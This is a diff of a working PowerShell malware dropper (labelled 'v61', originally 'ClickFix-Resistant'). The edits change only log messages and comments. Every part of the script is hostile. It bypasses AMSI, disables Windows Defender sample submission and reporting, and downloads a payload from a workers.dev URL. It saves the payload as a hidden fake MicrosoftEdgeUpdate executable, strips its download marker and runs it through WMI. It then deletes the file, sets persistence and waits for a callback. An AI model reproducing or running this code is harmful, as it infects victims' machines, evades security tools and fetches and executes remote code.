@@ -1,7 +1,7 @@
 $ErrorActionPreference = 'SilentlyContinue'
-Write-Host "[+] v61 ClickFix-Resistant Drop started at $(Get-Date)" -ForegroundColor Green
+Write-Host "[+] v61 Final Drop started at $(Get-Date)" -ForegroundColor Green
 
-# Obfuscated AMSI Bypass
+# AMSI Bypass
 $z = 'AmsiUtils'; $y = 'amsiInitFailed'
 [Ref].Assembly.GetType("System.Management.Automation.$z").GetField($y,'NonPublic,Static').SetValue($null,$true)
 
@@ -15,33 +15,32 @@ New-Item $k -Force | Out-Null
 Set-ItemProperty $k "SubmitSamplesConsent" 0 -Type DWord -Force
 Set-ItemProperty $k "SpyNetReporting" 0 -Type DWord -Force
 
-# Download + Drop
+# Download payload
 $u = "https://aged-mountain-614b.natalia-kush82.workers.dev/update"
 $b = (New-Object Net.WebClient).DownloadData($u)
-Write-Host "[+] Downloaded payload: $($b.Length) bytes" -ForegroundColor Green
+Write-Host "[+] Downloaded: $($b.Length) bytes" -ForegroundColor Green
 
+# Drop
 $r = [Guid]::NewGuid().ToString("N").Substring(0,8)
 $t = "$env:TEMP\MicrosoftEdgeUpdate_$r.exe"
-
 [IO.File]::WriteAllBytes($t, $b)
+
 Unblock-File $t -EA 0
 Remove-Item $t -Stream Zone.Identifier -EA 0
 [System.IO.File]::SetAttributes($t, 'Hidden')
 
-Write-Host "[+] Staged as: $t" -ForegroundColor Yellow
+Write-Host "[+] Staged: $t" -ForegroundColor Yellow
 
 Start-Sleep -Milliseconds (Get-Random -Minimum 700 -Maximum 1600)
 
 try {
     Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $t | Out-Null
     Start-Process $t -WindowStyle Hidden -EA 0
-    Write-Host "[+] Executed successfully" -ForegroundColor Green
-} catch {
-    Write-Host "[-] Execution error" -ForegroundColor Red
-}
+    Write-Host "[+] Executed" -ForegroundColor Green
+} catch {}
 
-# Fast cleanup
-Start-Job -ScriptBlock { param($f) Start-Sleep -Seconds 1.1; Remove-Item $f -Force -EA 0 } -ArgumentList $t | Out-Null
+# Cleanup
+Start-Job -ScriptBlock { param($f) Start-Sleep -Seconds 1.2; Remove-Item $f -Force -EA 0 } -ArgumentList $t | Out-Null
 
 # Persistence
 $flag = "$env:TEMP\persist_$([Environment]::MachineName.GetHashCode()).dat"
@@ -57,4 +56,3 @@ if(-not (Test-Path $flag)){
 
 Write-Host "[+] v61 running - waiting for callback..." -ForegroundColor Magenta
 Start-Sleep -Seconds 240
-Write-Host "[+] v61 completed" -ForegroundColor Green
